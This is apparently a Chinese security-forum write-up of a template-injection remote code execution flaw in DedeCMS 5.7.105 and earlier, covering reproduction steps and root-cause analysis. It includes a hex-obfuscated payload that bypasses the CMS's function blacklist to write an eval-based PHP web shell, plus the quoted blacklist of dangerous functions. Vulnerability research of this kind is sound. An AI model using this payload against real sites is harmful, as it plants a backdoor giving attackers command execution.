@@ -1,0 +1,119 @@
+<div class="detail_content markdown-body editormd-preview-container" id="markdown-body">
+<div id="app">
+<h2 data-content="1" id="c42f6d662d247d539045bf64068c719c">影响版本</h2>
+<p>漏洞影响版本： &lt;=DedeCMS v5.7.105</p>
+<h2 data-content="1" id="a87740ee8351ec373852e78a2cb83df3">环境搭建</h2>
+<p>下载dedecms v5.7.105版本或其以下的源码（可以去官网或者GitHub上下载）<br/>
+这里我用的就是5.7.105版本的<br/>
+然后用phpstudy搭建环镜</p>
+<h2 data-content="1" id="b43f6d10bb411f6c6fbcb459a9831608">漏洞复现</h2>
+<p>搭建好环境之后 注册一个账号 然后登录后台<br/>
+第一步，按照下面步骤新建一个模板</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161206-1e0ab306-26d5-1.png"/></p>
+<p>在下方的框里写上如下内容</p>
+<pre><code>&lt;?php
+"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73"('./shell.php', "&lt;?php eva" . "l(\$_GE" . "T[a]);");
+// file_put_contents('./shell.php', "&lt;?php eval($_GET[a]);");</code></pre>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161232-2d295338-26d5-1.png"/></p>
+<p>第二步，按照下面步骤新建一个页面</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161312-44ff1a92-26d5-1.png"/></p>
+<p>这里新建页面的时候，主要注意的就是那个文件名的后缀要写成.<code>.php</code>，然后模板文件名那里的<code>htm</code>文件，写之前新建模板里的<code>htm</code>（是否编译那里是或者否都可以）<br/>
+这里会把htm文件里的内容写入到新建的php文件里</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161352-5d3979c2-26d5-1.png"/></p>
+<p>然后访问</p>
+<pre><code>http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/1.php</code></pre>
+<p>此时会在a目录下生成一个shell.php文件<br/>
+内容为:</p>
+<pre><code>&lt;?php eval($_GET[a]);");</code></pre>
+<p>然后测试一下</p>
+<pre><code>http://localhost/DedeCMS-V5.7.105-UTF8/uploads/a/shell.php?a=phpinfo();</code></pre>
+<p>成功利用</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161429-732340c4-26d5-1.png"/></p>
+<p>再测测，确实没问题</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161457-83d39054-26d5-1.png"/></p>
+<h2 data-content="1" id="2f8b916cf41f7c155b3df4d80d627c33">漏洞成因分析</h2>
+<p>首先我们看到创建模板页面，看到创建模板的接口调用的是是tpl.php文件</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720161524-93c289f2-26d5-1.png"/></p>
+<p>uploads/dede/tpl.php文件，截取主要的部分然后加了一些注释</p>
+<pre><code>/*
+ (/\*)[\s\S]*(\*/)#i 是一个正则表达式模式，表示要匹配的内容。
+ 其中，/\*和 \*/表示分别匹配开头的 "/" 和结尾的 "/" 符号，[\s\S]* 表示匹配任意空白字符或非空白字符，i 表示忽略大小写。
+ 这个正则表达式的作用是查找 $content 变量中所有以 "/" 开头、以 "/" 结尾的注释，并将其替换为空字符串。这样可以从文本中删除所有的注释内容。
+ */
+$content = preg_replace("#(/\*)[\s\S]*(\*/)#i", '', $content);
+
+// 黑名单正则匹配，禁了下面这些函数
+global $cfg_disable_funs;
+$cfg_disable_funs = isset($cfg_disable_funs) ? $cfg_disable_funs : 'phpinfo,eval,assert,exec,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source,file_put_contents,fsockopen,fopen,fwrite,preg_replace';
+$cfg_disable_funs = $cfg_disable_funs.',[$]_GET,[$]_POST,[$]_REQUEST,[$]_FILES,[$]_COOKIE,[$]_SERVER,include,create_function,array_map,call_user_func,call_user_func_array,array_filert';
+
+foreach (explode(",", $cfg_disable_funs) as $value) {
+    //将 `$value` 变量中的所有空格字符（包括空格、制表符和换行符等）都删除。
+    $value = str_replace(" ", "", $value);
+    if(!empty($value) &amp;&amp; preg_match("#[^a-z]+['\"]*{$value}['\"]*[\s]*[([{]#i", " {$content}") == TRUE) {
+        $content = dede_htmlspecialchars($content);
+        die("DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;{$content}&lt;/pre&gt;");
+    }
+  }
+    /*
+    如果 $content 的开头部分包含 "&lt;?"、"&lt;?php" 或 "&lt;?=" 等 PHP 代码标识符，并且标识符后跟着一个或多个空白字符，则条件成立。即就是匹配php代码的头
+    */
+
+    if(preg_match("#^[\s\S]+&lt;\?(php|=)?[\s]+#i", " {$content}") == TRUE) {
+    //这里的U为惰性匹配 匹配函数变量执行，例如$a="phpinfo"，则$a()就会被匹配
+    if(preg_match("#[$][_0-9a-z]+[\s]*[(][\s\S]*[)][\s]*[;]#iU", " {$content}") == TRUE) {
+        $content = dede_htmlspecialchars($content);
+        die("DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;{$content}&lt;/pre&gt;");
+    }
+    // 就是在上一个匹配前加了一个@，防止报错
+    if(preg_match("#[@][$][_0-9a-z]+[\s]*[(][\s\S]*[)]#iU", " {$content}") == TRUE) {
+        $content = dede_htmlspecialchars($content);
+        die("DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;{$content}&lt;/pre&gt;");
+    }
+    // 匹配反引号`，防止命令执行
+    if(preg_match("#[`][\s\S]*[`]#i", " {$content}") == TRUE) {
+        $content = dede_htmlspecialchars($content);
+        die("DedeCMS提示：当前页面中存在恶意代码！&lt;pre&gt;{$content}&lt;/pre&gt;");
+    }
+     }</code></pre>
+<p>然后这些过滤不算很严格，我们还是有很多方法可以去绕过的，比如我们上面的漏洞复现的时候写入的代码就可以绕过这些限制<br/>
+然后看到编辑模板的地方<br/>
+可以看到这里要求我们的模板结尾必须是<code>.htm</code>，而且还将一些表单标签的关键字进行了替换</p>
+<pre><code>else if($action == 'saveedit')  
+{  
+csrf_check();  
+if($filename == '')  
+{  
+ShowMsg('未指定要编辑的文件或文件名不合法', '-1');  
+exit();  
+}  
+if(!preg_match("#\.htm$#", $filename))  
+{  
+ShowMsg('DEDE模板文件，文件名必须用.htm结尾！', '-1');  
+exit();  
+}  
+$content = stripslashes($content);  
+$content = preg_replace("/##textarea/i", "&lt;textarea", $content);  
+$content = preg_replace("/##\/textarea/i", "&lt;/textarea", $content);  
+$content = preg_replace("/##form/i", "&lt;form", $content);  
+$content = preg_replace("/##\/form/i", "&lt;/form", $content);  
+$truefile = $templetdird.'/'.$filename;  
+$fp = fopen($truefile, 'w');  
+fwrite($fp, $content);  
+fclose($fp);  
+ShowMsg('成功修改或新建文件', 'templets_main.php?acdir='.$acdir);  
+exit();  
+}</code></pre>
+<p>然后看到新建页面的源码</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720162134-7084eec0-26d6-1.png"/></p>
+<p><code>templets_one_add.php</code>前面都是在对新建页面的内容进行一个处理，我们在新建页面的时候并没有另外写内容，所以前面都不用管，我们看到这里对新建页面进行了一个保存</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720162206-839e9b1e-26d6-1.png"/></p>
+<p>那我们就来到<code>uploads/include/arc.sgpage.class.php</code>的<code>SavaToHtml</code>方法。这个函数主要作用是将当前对象的内容保存为HTML文件。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720162234-9435e752-26d6-1.png"/></p>
+<p>然后进入<code>uploads/include/dedetag.class.php</code>的<code>SaveTo</code>方法，这个函数的作用是将替换后的字符串保存到指定的文件中，即获取文件内容。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720162259-a31c2e2a-26d6-1.png"/></p>
+<p>最后看到<code>GetResult</code>方法，这个方法用于替换模板内容中的字符串，即将一个字符串中的特定标签替换为对应的值，然后返回替换后的字符串。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20230720162335-b8683f6c-26d6-1.png"/></p>
+<p>这个漏洞的成因简单来说，就是没有对用户新建的文件的名字是否合法做出判断，而且对文件内容的过滤也不完全，所以导致用户可以通过恶意输入进行利用。</p>
+</div>
+</div>
